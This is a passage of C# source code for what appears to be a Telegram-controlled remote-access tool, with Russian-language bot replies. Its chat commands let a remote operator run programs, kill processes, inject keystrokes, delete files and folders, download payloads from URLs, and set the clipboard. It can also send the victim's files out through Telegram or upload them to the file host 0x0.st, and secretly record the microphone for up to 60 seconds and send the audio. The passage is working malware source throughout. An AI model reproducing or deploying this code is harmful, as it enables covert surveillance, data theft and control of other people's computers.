                    SendKeys.SendWait(typein);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Ok*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch(Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (e.Message.Text.StartsWith("/mkdir"))
            {
                if (e.Message.Text == "/mkdir") return;
                string dirname = e.Message.Text.Replace("/mkdir ", "");
                if (!Directory.Exists(dirname))
                {
                    try
                    {
                        Directory.CreateDirectory(dirname);
                        await bot.SendTextMessageAsync(e.Message.Chat, "*Ok*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    }
                    catch(Exception ex)
                    {
                        await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                    }
                }
                else
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Такая папка уже есть!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (e.Message.Text.StartsWith("/upload"))
            {
                if (e.Message.Text == "/upload") return;
                string URL = e.Message.Text.Replace("/upload ", "");
                try
                {
                    string FileName = URL.Substring(
                        URL.LastIndexOf("/") + 1,
                        URL.Length - URL.LastIndexOf("/") - 1);
                    var ms = await bot.SendTextMessageAsync(e.Message.Chat, "*Загружаю файл \"" + FileName + "\"...*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    using (var request = new HttpRequest())
                    {
                        request.DownloadProgressChanged += async (object send, xNet.DownloadProgressChangedEventArgs ee) => {
                            try
                            {
                                await bot.EditMessageTextAsync(ms.Chat.Id, ms.MessageId, "*Загружаю файл \"" + FileName + "\"...*\n*Загружено:* " + Convert.ToString((int)ee.ProgressPercentage) + "%", Telegram.Bot.Types.Enums.ParseMode.Markdown);
                            }
                            catch
                            {

                            }
                        };
                        request.Post(URL).ToFile(FileName);
                    }
                    try
                    {
                        await bot.DeleteMessageAsync(ms.Chat.Id, ms.MessageId);
                    }
                    catch
                    {

                    }
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Файл \"" + FileName + "\" загружен!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Ошибка при загрузке файла!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (e.Message.Text.StartsWith("/rmdir"))
            {
                if (e.Message.Text == "/rmdir") return;
                string dirname = e.Message.Text.Replace("/rmdir ", "");
                if (!Directory.Exists(dirname))
                {
                    try
                    {
                        Directory.Delete(dirname, true);
                        await bot.SendTextMessageAsync(
                            e.Message.Chat,
                            "*Ok*",
                            Telegram.Bot.Types.Enums.ParseMode.Markdown,
                            replyToMessageId: e.Message.MessageId);
                    }
                    catch(Exception ex)
                    {
                        await bot.SendTextMessageAsync(
                            e.Message.Chat,
                            "<b>Error!</b>\n\n" + Convert.ToString(ex),
                            Telegram.Bot.Types.Enums.ParseMode.Html,
                            replyToMessageId: e.Message.MessageId);
                    }

                }
                else
                {
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "*Такой папки нет!*",
                        Telegram.Bot.Types.Enums.ParseMode.Markdown,
                        replyToMessageId: e.Message.MessageId);
                }
            }
            else if (e.Message.Text.StartsWith("/rm"))
            {
                if (e.Message.Text == "/rm") return;
                string dirname = e.Message.Text.Replace("/rm ", "");
                if (File.Exists(dirname))
                {
                    try
                    {
                        File.Delete(dirname);
                        await bot.SendTextMessageAsync(
                            e.Message.Chat,
                            "*Ok*",
                            Telegram.Bot.Types.Enums.ParseMode.Markdown,
                            replyToMessageId: e.Message.MessageId);
                    }
                    catch(Exception ex)
                    {
                        await bot.SendTextMessageAsync(
                            e.Message.Chat,
                            "<b>Error!</b>\n\n" + Convert.ToString(ex),
                            Telegram.Bot.Types.Enums.ParseMode.Html,
                            replyToMessageId: e.Message.MessageId);
                    }

                }
                else
                {
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "*Такой папки нет!*",
                        Telegram.Bot.Types.Enums.ParseMode.Markdown,
                        replyToMessageId: e.Message.MessageId);
                }
            }
            else if (e.Message.Text.StartsWith("/touch"))
            {
                if (e.Message.Text == "/touch") return;
                string filename = e.Message.Text.Replace("/touch ", "");
                try
                {
                    File.Create(filename);
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "*Ok*",
                        Telegram.Bot.Types.Enums.ParseMode.Markdown,
                        replyToMessageId: e.Message.MessageId);
                }
                catch(Exception ex)
                {
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "<b>Error!</b>\n\n" + Convert.ToString(ex),
                        Telegram.Bot.Types.Enums.ParseMode.Html,
                        replyToMessageId: e.Message.MessageId);
                }
            }
            else if (e.Message.Text.StartsWith("/download"))
            {
                if (e.Message.Text == "/download") return;
                string filename = e.Message.Text.Replace("/download ", "");
                if (File.Exists(filename))
                {
                    FileInfo file = new FileInfo(filename);
                    long size = file.Length;
                    if (size > 52428800)
                    {
                        await bot.SendTextMessageAsync(
                            e.Message.Chat,
                            "*Файл превышает 50мб!*",
                            Telegram.Bot.Types.Enums.ParseMode.Markdown,
                            replyToMessageId: e.Message.MessageId);
                        return;
                    }
                    await bot.SendTextMessageAsync(
                            e.Message.Chat,
                            "*Отправка файла...*",
                            Telegram.Bot.Types.Enums.ParseMode.Markdown,
                            replyToMessageId: e.Message.MessageId);
                    using (var stream = File.OpenRead(filename))
                    {
                        try
                        {
                            await bot.SendDocumentAsync(
                                e.Message.Chat,
                                stream,
                                filename,
                                replyToMessageId: e.Message.MessageId);
                        }
                        catch
                        {
                            await bot.SendTextMessageAsync(
                                e.Message.Chat,
                                "*Не удалось отправить файл!*",
                                Telegram.Bot.Types.Enums.ParseMode.Markdown,
                                replyToMessageId: e.Message.MessageId);
                        }

                    }
                }
                    else
                {
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "*Такого файла нет!*",
                        Telegram.Bot.Types.Enums.ParseMode.Markdown,
                        replyToMessageId: e.Message.MessageId);
                }
            }
            else if (e.Message.Text.StartsWith("/dl"))
            {
                if (e.Message.Text == "/dl") return;
                string filename = e.Message.Text.Replace("/dl ", "");
                if (File.Exists(filename))
                {
                    FileInfo file = new FileInfo(filename);
                    long size = file.Length;
                    if (size > 536870912)
                    {
                        await bot.SendTextMessageAsync(
                            e.Message.Chat,
                            "*Файл превышает 512мб!*",
                            Telegram.Bot.Types.Enums.ParseMode.Markdown,
                            replyToMessageId: e.Message.MessageId);
                        return;
                    }
                    var ms = await bot.SendTextMessageAsync(
                            e.Message.Chat,
                            "*Отправка файла...*",
                            Telegram.Bot.Types.Enums.ParseMode.Markdown,
                            replyToMessageId: e.Message.MessageId);
                    using (var stream = File.OpenRead(filename))
                    {
                        try
                        {
                            string url;
                            using (var request = new HttpRequest())
                            {
                                request
                                    .AddFile("file", filename);
                                request.UploadProgressChanged += async (object send, xNet.UploadProgressChangedEventArgs ee) => {
                                    try
                                    {
                                        await bot.EditMessageTextAsync(ms.Chat.Id, ms.MessageId, "Загружено: " + Convert.ToString((int)ee.ProgressPercentage) + "%");
                                    } catch
                                    {

                                    }
                                };
                                url = request.Post("0x0.st").ToString();
                            }
                            try
                            {
                                await bot.DeleteMessageAsync(ms.Chat.Id, ms.MessageId);
                            } catch
                            {

                            }
                            await bot.SendTextMessageAsync(
                                e.Message.Chat,
                                url,
                                replyToMessageId: e.Message.MessageId);
                        }
                        catch
                        {
                            await bot.SendTextMessageAsync(
                                e.Message.Chat,
                                "*Не удалось отправить файл!*",
                                Telegram.Bot.Types.Enums.ParseMode.Markdown,
                                replyToMessageId: e.Message.MessageId);
                        }

                    }
                }
                else
                {
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "*Такого файла нет!*",
                        Telegram.Bot.Types.Enums.ParseMode.Markdown,
                        replyToMessageId: e.Message.MessageId);
                }
            }
            else if (e.Message.Text.StartsWith("/run"))
            {
                if (e.Message.Text == "/run") return;
                string filename = e.Message.Text.Replace("/run ", "");
                try
                {
                    Process.Start(filename);
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "*Файл запущен!*",
                        Telegram.Bot.Types.Enums.ParseMode.Markdown,
                        replyToMessageId: e.Message.MessageId);
                }
                catch
                {
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "*Ошибка! Возможно, такого файла нет, либо нет доступа!*",
                        Telegram.Bot.Types.Enums.ParseMode.Markdown,
                        replyToMessageId: e.Message.MessageId);
                }

            }
            else if (e.Message.Text.StartsWith("/kill"))
            {
                if (e.Message.Text == "/kill") return;
                string pid = e.Message.Text.Replace("/kill ", "");
                try
                {
                    try
                    {
                        Convert.ToInt32(pid);
                    } catch { return; }
                    Process.GetProcessById(Convert.ToInt32(pid)).Kill();
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "*Killed!*",
                        Telegram.Bot.Types.Enums.ParseMode.Markdown,
                        replyToMessageId: e.Message.MessageId);
                }
                catch
                {
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "*Ошибка! Возможно, нет доступа, либо такого процесса нет!*",
                        Telegram.Bot.Types.Enums.ParseMode.Markdown,
                        replyToMessageId: e.Message.MessageId);
                }

            }
            else if (e.Message.Text.StartsWith("/recmic"))
            {
                if(isrec)
                {
                    await bot.SendTextMessageAsync(
                         e.Message.Chat,
                        "Вы уже записываете аудио! Подожите пока оно вам прийдёт!",
                         Telegram.Bot.Types.Enums.ParseMode.Markdown,
                         replyToMessageId: e.Message.MessageId);
                    return;
                }
                if (e.Message.Text == "/recmic")
                {
                    await bot.SendTextMessageAsync(
                         e.Message.Chat,
                        "*Укажите количество секунд для записи! Но не больше 60!\nПример:* `/recmic 5`",
                         Telegram.Bot.Types.Enums.ParseMode.Markdown,
                         replyToMessageId: e.Message.MessageId);
                    return;
                }
                string s = e.Message.Text.Replace("/recmic ", "");
                int t;
                try
                {
                    t = Convert.ToInt32(s);
                }
                catch
                {
                    await bot.SendTextMessageAsync(
                         e.Message.Chat,
                        "*Укажите количество секунд для записи! Но не больше 60!\nПример:* `/recmic 5`",
                         Telegram.Bot.Types.Enums.ParseMode.Markdown,
                         replyToMessageId: e.Message.MessageId);
                    return;
                }
                if(t > 60)
                {
                    await bot.SendTextMessageAsync(
                         e.Message.Chat,
                        "*Укажите количество секунд меньше 60!*",
                         Telegram.Bot.Types.Enums.ParseMode.Markdown,
                         replyToMessageId: e.Message.MessageId);
                    return;
                }
                try
                {
                    await bot.SendTextMessageAsync(
                         e.Message.Chat,
                        "*Начинаю записывать...*",
                         Telegram.Bot.Types.Enums.ParseMode.Markdown,
                         replyToMessageId: e.Message.MessageId);
                    var f = Path.GetTempPath() + @"rec.wav";
                    isrec = true;
                    record("open new Type waveaudio Alias recsound", "", 0, 0);
                    record("record recsound", "", 0, 0);
                    Thread.Sleep(t * 1000);
                    record("save recsound " + f, "", 0, 0);
                    record("close recsound", "", 0, 0);
                    await bot.SendTextMessageAsync(
                         e.Message.Chat,
                        "*Отправляю запись...*",
                         Telegram.Bot.Types.Enums.ParseMode.Markdown,
                         replyToMessageId: e.Message.MessageId);
                    using (var stream = File.OpenRead(f))
                    {
                        await bot.SendAudioAsync(e.Message.Chat, stream, "rec.wav", replyToMessageId: e.Message.MessageId);
                        stream.Close();
                    }
                    Thread.Sleep(1000);
                    File.Delete(f);
                    isrec = false;
                }
                catch(Exception ex)
                {
                    await bot.SendTextMessageAsync(
                        e.Message.Chat,
                        "<b>Error!</b>\n\n" + Convert.ToString(ex),
                        Telegram.Bot.Types.Enums.ParseMode.Html,
                       replyToMessageId: e.Message.MessageId);
                    isrec = false;
                }
            }
            else if (e.Message.Text.StartsWith("/clipset"))
            {
                if (e.Message.Text == "/clipset") return;
                string ctxt = e.Message.Text.Replace("/clipset ", "");
                try
                {
                    Thread thread = new Thread(async () => {
                        try
                        {
                            Clipboard.SetText(ctxt);
                            await bot.SendTextMessageAsync(e.Message.Chat, "*Ok*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                        }

                    });
                    thread.SetApartmentState(ApartmentState.STA);
                    thread.Start();
                    thread.Join();
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
        }
    }
}
